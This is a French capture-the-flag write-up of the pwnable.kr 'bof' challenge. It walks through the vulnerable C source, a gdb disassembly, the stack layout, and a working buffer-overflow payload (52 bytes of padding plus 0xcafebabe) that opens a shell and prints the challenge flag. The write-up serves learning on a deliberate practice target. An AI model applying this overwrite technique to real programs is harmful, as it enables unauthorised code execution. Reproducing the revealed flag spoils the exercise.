# Bof

## Description

Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

ssh <bof@pwnable.kr> -p2222 (pw: guest)

## Writeup

flag: Daddy_I_just_pwned_a_buff3r!

### Contexte

Ici aussi, on commence avec un `ls -la` même si à ce niveau là, c'est
davantage pour voir le nom du programme C et de l'executable qu'autre chose.

```bash
bof@ubuntu:~$ ls -la
total 48
drwxr-x---   2 root bof   4096 Jun 15  2025 .
drwxr-xr-x 118 root root  4096 Jun  1  2025 ..
-rw-r--r--   1 root root   220 Feb 14  2025 .bash_logout
-rw-r--r--   1 root root  3771 Feb 14  2025 .bashrc
-rwxr-xr-x   1 root bof  15300 Mar 26  2025 bof
-rw-r--r--   1 root root   342 Mar 26  2025 bof.c
-rw-------   1 root root    46 Jun 15  2025 .gdb_history
-rw-r--r--   1 root root   811 Apr  3  2025 .profile
-rw-r--r--   1 root root    86 Apr  3  2025 readme
```

On voit un fichier readme.

```bash
bof@ubuntu:~$ cat readme
bof binary is running at "nc 0 9000" under bof_pwn privilege. 
get shell and read fla
```

### Analyse du code source

Et on jette un oeil au bof.c histoire d'avoir tous les éléments en main

```Clang
bof@ubuntu:~$ cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme); // smash me!
    if(key == 0xcafebabe){
        setregid(getegid(), getegid());
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

L'idée du challenge est donc de faire un overflow et si la clé lue est
`cafebabe` ca ouvre un shell qui, j'imagine, permettra d'avoir accès au flag.

Premier réflexe, essayer de faire un overflow même si les chances de réussite
sont faibles :

```bash
bof@ubuntu:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\xbe\xba\xfe\xca")') | ./bof
overflow me : Nah..
*** stack smashing detected ***: terminated
Aborted
```

### Désassemblage

On va donc devoir désassembler le programme pour savoir quelle est la taille
exacte du padding entre le buffer et `key`.

```bash
gdb ./bof
b func
r
disassemble func
```

Je ne reproduis pas ici le retour de `r` puisqu'on ne rentre pas encore dans
la fonction qui nous intéresse.

```bash
pwndbg> disassemble func
Dump of assembler code for function func:
   0x565561fd <+0>: push   ebp                  <---- prologue de la fonction
   0x565561fe <+1>: mov    ebp,esp
   0x56556200 <+3>: push   esi
   0x56556201 <+4>: push   ebx
=> 0x56556202 <+5>: sub    esp,0x30             <---- c'est le b qu'on a placé
```

Les quatre premières lignes classiques correspondent au prologue de la fonction
(et on retrouve d'ailleurs leur pendant dans les dernières lignes du `desas`
avec les `pop` et `ret` qui rétablissent le contexte à la fin du travail de la
fonction.)

Ce qui nous intéresse, c'est la ligne 5 : `sub    esp, 0x30`
On soustrait 0x30 de ESP. Donc on réserve 48 octets sur la stack pour les
variables locales.

Continuons la lecture avec ce qui nous importe le plus ici : trouver le
canary et trouver le offset entre la clé et le tableau.

```bash

   0x56556205 <+8>: call   0x56556100 <__x86.get_pc_thunk.bx>
   0x5655620a <+13>: add    ebx,0x2df6
   0x56556210 <+19>: mov    eax,gs:0x14
   0x56556216 <+25>: mov    DWORD PTR [ebp-0xc],eax
   0x56556219 <+28>: xor    eax,eax
   0x5655621b <+30>: sub    esp,0xc
   0x5655621e <+33>: lea    eax,[ebx-0x1ff8]
   0x56556224 <+39>: push   eax
   0x56556225 <+40>: call   0x56556050 <printf@plt>
   0x5655622a <+45>: add    esp,0x10
   0x5655622d <+48>: sub    esp,0xc
   0x56556230 <+51>: lea    eax,[ebp-0x2c]
   0x56556233 <+54>: push   eax
   0x56556234 <+55>: call   0x56556060 <gets@plt>
   0x56556239 <+60>: add    esp,0x10
   0x5655623c <+63>: cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x56556243 <+70>: jne    0x56556272 <func+117>

```

- Le canary se trouve à `[ebp-0xc]`
- Le tableau de char overflowme commence à `[ebp-0x2c]`
- La key qu'on cherche à écraser est à `[ebp+0x8]`

Il y a donc un padding de `0x2c + 0x8 = 0x34 = 52 octets` entre
le tableau de caractères et la clé qu'on veut écraser.

La stack ressemble donc à ca.

Adresses basses (ESP)
┌─────────────────────────────────────┐
│                                     │  ebp - 0x2c
│       overflowme[32]                │
│       32 octets — buffer vulnérable │
│                                     │
├─────────────────────────────────────┤
│       Padding (alignement)          │  ebp - 0x0c
├─────────────────────────────────────┤
│       Stack canary (4 octets)       │  ebp - 0x0c
├─────────────────────────────────────┤
│       Saved esi, ebx (8 octets)     │  ebp - 0x08
├─────────────────────────────────────┤
│       Saved EBP (4 octets)          │  ebp
├─────────────────────────────────────┤
│       Return address (4 octets)     │  ebp + 0x04 (poussé à l'appel de func)
├─────────────────────────────────────┤
│       key = 0xdeadbeef (4 octets)   │  ebp + 0x08 (poussé par main)
└─────────────────────────────────────┘
Adresses hautes

         │                        ▲
         │  gets() écrit          │
         │  de ebp-0x2c           │  52 octets
         │  vers les adresses     │  de padding
         │  hautes                │
         ▼                        │

Le key qu'on veut écraser est celui qui est poussé par main avant l'appel de
la fonction func() pour que le programme compare la key en paramètre avec
Oxcafebabe. Présentement, la comparaison échoue et on fait le `jne 0x56556272`,
donc le saut vers le `else`. Il faut donc qu'on vienne écraser `0xdeadbeef`.

Comme l'objectif est juste d'ouvrir un shell et pas d'avoir un retour de
fonction, on peut ne pas se préoccuper du canary et juste faire un buffer
overflow.

### Exploitation

Notre objectif ici c'est donc de passer le payload suivant :
`[52 octets de padding] + [0xcafebabe en little-endian]`
(le little-endian est un guess pas trop wild)

On peut reprendre la ligne de python qu'on a essayée au début en modifiant le
padding. Et on se souvient qu'on veut ouvrir un shell et pas avoir un retour
de la fonction donc on va utiliser `cat` pour maintenir le shell interactif
à travers le pipe. Sinon, on aurait juste un retour du canary.

```bash
bof@ubuntu:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca")'; cat) | ./bof
ls
ls
bof  bof.c  readme
cat readme
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
```

L'execution locale fonctionne mais j'avais oublié que le flag se trouvait sur
un serveur distant : `nc 0 9000`.

```bash
bof@ubuntu:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca")'; cat) | nc 0 9000
ls -l
total 7968
-rwxr-xr-x 1 root root      15300 Apr  3  2025 bof
-rw-r--r-- 1 root root        372 Apr  3  2025 bof.c
-r--r----- 1 root bof_pwn      29 Apr  3  2025 flag
-rw-r--r-- 1 root root    8125645 Dec 24 07:23 log
-rwx------ 1 root root        768 Apr  3  2025 super.pl
cat flag
Daddy_I_just_pwned_a_buff3r!
```
